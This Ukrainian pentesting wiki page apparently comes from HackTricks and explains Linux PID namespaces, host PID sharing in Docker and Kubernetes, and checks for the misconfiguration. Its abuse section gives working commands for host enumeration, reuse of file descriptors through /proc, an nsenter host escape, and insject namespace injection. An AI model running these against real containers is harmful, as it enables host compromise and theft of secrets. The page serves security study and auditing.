# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Огляд

PID namespace контролює нумерацію процесів і те, які процеси є видимими. Саме тому container може мати власний PID 1, хоча він не є реальною машиною. Усередині namespace workload бачить те, що виглядає як локальне дерево процесів. Поза namespace host і надалі бачить реальні PID host і повну картину процесів.

З погляду security PID namespace важливий, оскільки видимість процесів має високу цінність. Якщо workload може бачити процеси host, він може отримати можливість спостерігати назви сервісів, аргументи командного рядка, secrets, передані в аргументах процесів, стан, отриманий із середовища через `/proc`, а також потенційні цілі для входу в namespace. Якщо він може не лише бачити ці процеси, а й, наприклад, надсилати сигнали або використовувати ptrace за відповідних умов, проблема стає значно серйознішою.

## Робота

Новий PID namespace починається з власної внутрішньої нумерації процесів. Перший процес, створений усередині нього, стає PID 1 з погляду цього namespace, а це також означає, що він отримує спеціальну init-подібну семантику для осиротілих дочірніх процесів і поведінки сигналів. Це пояснює багато особливостей container, пов'язаних з init-процесами, збиранням zombie-процесів і тим, чому в container іноді використовують невеликі init-обгортки.

Важливий security-урок полягає в тому, що процес може здаватися ізольованим, оскільки бачить лише власне дерево PID, але цю ізоляцію можна навмисно прибрати. Docker надає для цього параметр `--pid=host`, а Kubernetes — `hostPID: true`. Коли container приєднується до PID namespace host, workload безпосередньо бачить процеси host, і багато подальших attack paths стають набагато реалістичнішими.

## Лабораторна робота

Щоб вручну створити PID namespace:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Тепер shell бачить приватне представлення процесів. Прапорець `--mount-proc` важливий, оскільки він монтує екземпляр procfs, що відповідає новому PID namespace, завдяки чому список процесів усередині є узгодженим.

Щоб порівняти поведінку контейнера:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Різницю видно одразу, і її легко зрозуміти, тому це хороша перша лабораторна робота для читачів.

## Використання під час роботи

Звичайні контейнери в Docker, Podman, containerd і CRI-O отримують власний PID namespace. Kubernetes Pods зазвичай також отримують ізольоване представлення процесів, якщо workload явно не запитує спільне використання PID хоста. Середовища LXC/Incus покладаються на той самий примітив ядра, хоча варіанти використання system-container можуть відкривати складніші дерева процесів і спонукати до більшої кількості debugging shortcuts.

Скрізь діє одне й те саме правило: якщо runtime вирішив не ізолювати PID namespace, це навмисне послаблення межі контейнера.

## Неправильні конфігурації

Канонічна неправильна конфігурація — спільне використання PID хоста. Команди часто виправдовують це зручністю debugging, monitoring або керування сервісами, але це завжди слід розглядати як суттєвий виняток із безпеки. Навіть якщо контейнер не має безпосередньої можливості запису до процесів хоста, сама видимість може розкрити багато інформації про систему. Після додавання таких capabilities, як `CAP_SYS_PTRACE`, або корисного доступу до procfs ризик суттєво зростає.

Ще одна помилка — вважати, що спільне використання PID хоста є нешкідливим лише тому, що workload за замовчуванням не може завершувати host processes або виконувати ptrace над ними. Такий висновок ігнорує цінність enumeration, наявність цілей для входу в namespace і те, як видимість PID поєднується з іншими послабленими controls.

## Зловживання

Якщо PID namespace хоста спільно використовується, attacker може переглядати host processes, збирати аргументи процесів, визначати цікаві сервіси, знаходити відповідні PID для `nsenter` або поєднувати видимість процесів із привілеями, пов’язаними з ptrace, щоб втручатися в роботу хоста чи сусідніх workloads. У деяких випадках достатньо просто побачити потрібний довгоживучий процес, щоб змінити подальший план attack.

Першим практичним кроком завжди є підтвердження того, що host processes справді видимі:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Після того як PID хоста стають видимими, аргументи процесів і цілі входу до namespace часто стають найкориснішим джерелом інформації:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Якщо доступний `nsenter` і наявні достатні привілеї, перевірте, чи можна використати видимий процес хоста як міст між namespace:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Навіть коли вхід заблоковано, спільний доступ до PID хоста вже є цінним, оскільки розкриває структуру сервісів, компоненти середовища виконання та потенційні привілейовані процеси, які можна атакувати далі.

Видимість PID хоста також робить зловживання файловими дескрипторами реалістичнішим. Якщо привілейований процес хоста або сусіднє робоче навантаження має відкритий конфіденційний файл чи сокет, зловмисник може отримати доступ до `/proc/<pid>/fd/` і повторно використати цей дескриптор залежно від власника, параметрів монтування procfs та моделі цільового сервісу.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Ці команди корисні, оскільки вони показують, чи зменшує `hidepid=1` або `hidepid=2` видимість між процесами, а також чи взагалі видимі очевидно цікаві дескриптори, як-от відкриті файли із секретами, логи або Unix-сокети.

### Повний приклад: host PID + `nsenter`

Спільне використання host PID стає прямим host escape, коли процес також має достатні привілеї для приєднання до host namespaces:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Якщо команда виконується успішно, процес контейнера тепер працює в просторах імен монтування, UTS, мережі, IPC та PID хоста. Наслідком є негайна компрометація хоста.

Навіть якщо `nsenter` відсутній, такого самого результату можна досягти через бінарний файл хоста, якщо файлову систему хоста змонтовано:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Останні примітки щодо runtime

Деякі атаки, релевантні до PID namespace, не є традиційними неправильними конфігураціями `hostPID: true`, а натомість пов’язані з багами реалізації runtime у способі застосування захистів procfs під час налаштування контейнера.

#### Race в `maskedPaths` до host procfs

У вразливих версіях `runc` атакувальники, здатні контролювати образ контейнера або workload `runc exec`, могли скористатися race під час етапу маскування, замінивши `/dev/null` усередині контейнера на symlink до чутливого шляху procfs, наприклад `/proc/sys/kernel/core_pattern`. Якщо race вдавалася, bind mount для masked path міг бути застосований до неправильного target і відкрити host-global procfs knobs новому контейнеру.<sup>[[1]](#references)</sup>

Корисна команда для перевірки:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Це важливо, оскільки кінцевий вплив може бути таким самим, як і за прямого доступу до procfs: доступний для запису `core_pattern` або `sysrq-trigger`, після чого можливе виконання коду на хості або відмова в обслуговуванні.

#### Namespace injection with `insject`

Інструменти для ін'єкції в namespace, такі як `insject`, показують, що взаємодія з PID namespace не завжди вимагає попереднього входу в цільовий namespace до створення процесу. Допоміжний інструмент може під'єднатися пізніше, використати `setns()` і виконати код, зберігаючи видимість цільового PID-простору:<sup>[[2]](#references)</sup>
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Цей тип техніки має значення переважно для розширеного debugging, offensive tooling і post-exploitation workflows, де контекст namespace потрібно під’єднати після того, як runtime уже ініціалізував workload.

### Пов’язані патерни зловживання FD

Варто явно зазначити два патерни, коли host PIDs видимі. По-перше, привілейований процес може зберігати чутливий файловий дескриптор відкритим після `execve()`, якщо його не було позначено як `O_CLOEXEC`. По-друге, сервіси можуть передавати файлові дескриптори через Unix sockets за допомогою `SCM_RIGHTS`. В обох випадках важливим об’єктом є вже не pathname, а вже відкритий handle, який процес із нижчими привілеями може успадкувати або отримати.

Це важливо під час роботи з контейнерами, оскільки handle може вказувати на `docker.sock`, привілейований log, файл із секретом хоста або інший цінний об’єкт, навіть якщо сам шлях недоступний безпосередньо з файлової системи контейнера.

## Перевірки

Мета цих команд — визначити, чи має процес приватне представлення PID, чи вже може перелічувати значно ширше середовище процесів.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Що тут цікаво:

- Якщо список процесів містить очевидні host services, імовірно, спільне використання PID хоста вже активне.
- Бачити лише невелике локальне дерево контейнера — це нормальний базовий стан; наявність `systemd`, `dockerd` або сторонніх daemons — ні.
- Коли PID хоста стають видимими, навіть доступна лише для читання інформація про процеси стає корисною для розвідки.

Якщо ви виявили контейнер, запущений зі спільним використанням PID хоста, не сприймайте це як косметичну відмінність. Це суттєво змінює те, що workload може спостерігати та потенційно на що впливати.
